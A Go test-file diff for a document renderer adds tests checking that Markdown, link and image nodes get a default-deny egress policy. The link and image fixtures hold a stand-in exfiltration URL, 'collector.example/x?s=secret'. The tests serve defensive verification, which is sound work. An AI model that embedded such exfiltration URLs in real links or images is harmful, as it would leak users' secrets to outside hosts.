@@ -112,6 +112,134 @@ func TestMarkdownCorpus(t *testing.T) {
 
 func policyIsPermissive(name string) bool { return name == "" || name == "permissive" }
 
+// markdownNode builds a decoded Markdown node carrying this source. It goes out
+// through the canonical encoder and back through the decoder on purpose: the
+// ambient leg's whole claim is about what happens to a DECODED tree, so a
+// hand-built struct that never met the codec would be testing a different
+// posture from the one being asserted.
+func markdownNode(t *testing.T, source string) wire.Node {
+	t.Helper()
+	built := wire.Node{
+		ID:   "md",
+		Kind: wire.Obj{Tag: "Markdown", Fields: map[string]wire.Value{"text": wire.Str(source)}},
+	}
+	canonical, err := wire.EncodeNode(built)
+	if err != nil {
+		t.Fatalf("encoding the markdown node: %v", err)
+	}
+	node, err := wire.DecodeNode(canonical)
+	if err != nil {
+		t.Fatalf("decoding the markdown node: %v", err)
+	}
+	return node
+}
+
+// TestMarkdownCorpusAmbient is the AMBIENT leg of the same corpus, and it asks a
+// different question from TestMarkdownCorpus above.
+//
+// That leg calls MarkdownToHTMLWithEgress directly, which certifies the SEAM: a
+// policy, handed in, is honoured. It cannot certify that this host's node
+// rendering REACHES the seam — a renderer whose Markdown arm still called the
+// pure permissive function would pass it in full. So this leg renders each
+// fixture as a Markdown NODE through the ordinary entry points and asserts the
+// fixture's html appears byte-exact inside the markdown wrapper.
+//
+// The denyNonLocal fixtures are rendered through RenderHTML with NO POLICY
+// NAMED AT ALL. That is the acceptance criterion in executable form: the
+// default-deny is ambient, not opt-in. A fixture whose policy is something else
+// names it through RenderHTMLWithEgress, because that policy is not the
+// default and reaching it deliberately is exactly the intended shape.
+func TestMarkdownCorpusAmbient(t *testing.T) {
+	corpus, _ := loadCorpus(t)
+	raw, err := os.ReadFile(filepath.Join(corpus, "markdown", "corpus.json"))
+	if err != nil {
+		t.Skipf("markdown corpus not found: %v", err)
+	}
+	var m markdownCorpus
+	if err := json.Unmarshal(raw, &m); err != nil {
+		t.Fatalf("parsing markdown corpus: %v", err)
+	}
+	ambientDefault := 0
+	for _, fx := range m.Fixtures {
+		t.Run(fx.ID, func(t *testing.T) {
+			node := markdownNode(t, fx.Source)
+			var html string
+			if fx.Policy == "denyNonLocal" {
+				// No policy named — the ambient default IS denyNonLocal.
+				html = renderer.RenderHTML(node, nil)
+			} else {
+				html = renderer.RenderHTMLWithEgress(node, nil, egressPolicyFor(t, fx.Policy))
+			}
+			want := `<div class="fuaran-markdown">` + fx.HTML + `</div>`
+			if !strings.Contains(html, want) {
+				t.Errorf("the node render did not reach the policy-taking markdown seam: %s",
+					firstDiff(html, want))
+			}
+		})
+		if fx.Policy == "denyNonLocal" {
+			ambientDefault++
+		}
+	}
+	// A corpus with no denyNonLocal fixture would run this whole leg through
+	// the named entry point, proving nothing about the ambient default — the
+	// one property the leg exists for.
+	if ambientDefault == 0 {
+		t.Fatalf("no denyNonLocal fixture in the markdown corpus (%d total) — "+
+			"the ambient-default leg is vacuous and cannot fail", len(m.Fixtures))
+	}
+	t.Logf("markdown corpus AMBIENT leg EXECUTED: %d fixtures, %d of them through the DEFAULT entry point with no policy named",
+		len(m.Fixtures), ambientDefault)
+}
+
+// TestAmbientEgressAtTheNodeCallSites is the non-markdown half of the same
+// claim: a Link href and an Image src reach the policy through the DEFAULT
+// entry point, with the refusal recorded in the document and the query string —
+// where an exfiltrated payload sits — absent from every emitted byte.
+func TestAmbientEgressAtTheNodeCallSites(t *testing.T) {
+	const exfil = "https://collector.example/x?s=secret"
+	cases := []struct {
+		name, json, marker string
+	}{
+		{
+			"link",
+			`{"id":"l","kind":{"$type":"Link","download":false,"href":{"$type":"Static","value":"` + exfil + `"},"label":"The report"}}`,
+			`data-fuaran-egress-refused="hyperlink:collector.example"`,
+		},
+		{
+			"image",
+			`{"id":"i","kind":{"$type":"Image","alt":"chart","src":{"$type":"Static","value":"` + exfil + `"},"variant":"Default"}}`,
+			`data-fuaran-egress-refused="media:collector.example"`,
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			node, err := wire.DecodeNode(c.json)
+			if err != nil {
+				t.Fatalf("decode: %v", err)
+			}
+			// No policy named anywhere — this is the acceptance criterion.
+			html := renderer.RenderHTML(node, nil)
+			if !strings.Contains(html, renderer.EgressRefusalURL) {
+				t.Errorf("the destination was not refused under the ambient default:\n%s", html)
+			}
+			if !strings.Contains(html, c.marker) {
+				t.Errorf("html is missing the refusal marker %q:\n%s", c.marker, html)
+			}
+			for _, leak := range []string{"?s=secret", "s=secret", "collector.example/x"} {
+				if strings.Contains(html, leak) {
+					t.Errorf("the refused URL's %q survived into the document:\n%s", leak, html)
+				}
+			}
+			// And the named opt-out still renders the real destination — the
+			// refusal is a policy answer, not a hard-coded neuter.
+			widened := renderer.RenderHTMLWithEgress(node, nil, renderer.PermissiveEgress())
+			if !strings.Contains(widened, exfil) {
+				t.Errorf("the named permissive entry point did not emit the destination:\n%s", widened)
+			}
+		})
+	}
+}
+
 // referenceHostNames are the spellings the F# reference host has shipped under.
 // The sibling was renamed once (fuaran → fuaran-dotnet) and the oracles' paths
 // were not updated, so every one of them Skipf'd for as long as the rename was
